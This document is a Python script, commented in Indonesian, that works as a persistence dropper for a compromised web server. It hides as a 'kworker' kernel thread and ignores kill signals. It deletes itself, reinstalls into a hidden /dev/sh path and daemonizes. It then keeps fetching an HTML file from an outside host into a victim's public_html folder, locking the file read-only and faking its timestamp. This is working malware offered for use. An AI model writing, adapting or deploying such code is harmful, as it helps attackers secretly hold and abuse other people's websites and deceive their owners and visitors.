import os
import sys
import time
import signal
import ctypes
import random

# =====================[ KONFIGURASI ]========================
TARGET_DIR = "/home/greenlea/public_html/venue/"

FILES = {
    "amp.html": "https://ikansalmon.org/r/1dcd931f/raw",
}

# Timestamp dinamis (format touch)
TIMESTAMP = time.strftime("%Y%m%d%H%M.%S")

SLEEP_INTERVAL = 5
SCRIPT_DIR = "/dev/sh"
SCRIPT_NAME = ".kworker"
SCRIPT_PATH = os.path.join(SCRIPT_DIR, SCRIPT_NAME)
FIXED_PROCESS_NAME = b"kworker/0:1"


# ================ [ Anti-kill Signal ] ==================
def ignore_signal(signum, frame):
    pass

for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGHUP, signal.SIGQUIT, signal.SIGTSTP]:
    try:
        signal.signal(sig, ignore_signal)
    except:
        pass


# =================== [ Rename Process ] ====================
def rename_process():
    try:
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, FIXED_PROCESS_NAME, 0, 0, 0)  # PR_SET_NAME
        with open("/proc/self/comm", "w") as f:
            f.write(FIXED_PROCESS_NAME.decode('utf-8'))
        sys.argv = [FIXED_PROCESS_NAME.decode('utf-8')]
    except:
        pass


# =============== [ Download File ] ==================
def download_file(url, file_path):
    for attempt in range(3):
        try:
            cmd = f"curl -s --max-time 15 -L {url} -o {file_path}"
            if os.system(cmd) == 0:
                os.chmod(file_path, 0o444)
                os.system(f"touch -t {TIMESTAMP} {file_path}")
                return True
        except:
            pass
        time.sleep(2 ** attempt)
    return False


# ============== [ Enforce Permission ] =================
def enforce_permission(path):
    try:
        os.chmod(path, 0o444)
    except:
        pass


# =================== [ Daemonize ] ====================
def daemonize():
    try:
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
        os.umask(0)
        for fd in (0, 1, 2):
            try:
                os.close(fd)
            except:
                pass
        devnull = os.open('/dev/null', os.O_RDWR)
        os.dup2(devnull, 0)
        os.dup2(devnull, 1)
        os.dup2(devnull, 2)
    except:
        pass


# =================== [ MAIN ] ====================
if __name__ == "__main__":
    try:
        this_file = os.path.abspath(__file__)
    except:
        this_file = sys.argv[0]

    # Auto delete original script
    try:
        if os.path.exists(this_file) and this_file != SCRIPT_PATH:
            os.remove(this_file)
    except:
        pass

    # Copy ke lokasi persisten jika belum
    if not os.path.exists(SCRIPT_PATH):
        try:
            if not os.path.isdir(SCRIPT_DIR):
                os.makedirs(SCRIPT_DIR, exist_ok=True)
            with open(this_file, "rb") as src:
                with open(SCRIPT_PATH, "wb") as dst:
                    dst.write(src.read())
            os.chmod(SCRIPT_PATH, 0o444)
            os.execl(sys.executable, sys.executable, SCRIPT_PATH)
        except:
            pass

    daemonize()
    rename_process()

    # Pastikan target directory ada
    os.makedirs(TARGET_DIR, exist_ok=True)

    # Main Loop
    while True:
        try:
            rename_process()

            for fname, url in FILES.items():
                fpath = os.path.join(TARGET_DIR, fname)
                if not os.path.exists(fpath):
                    download_file(url, fpath)
                else:
                    enforce_permission(fpath)

            time.sleep(SLEEP_INTERVAL + random.uniform(-2, 2))

        except Exception:
            time.sleep(10)
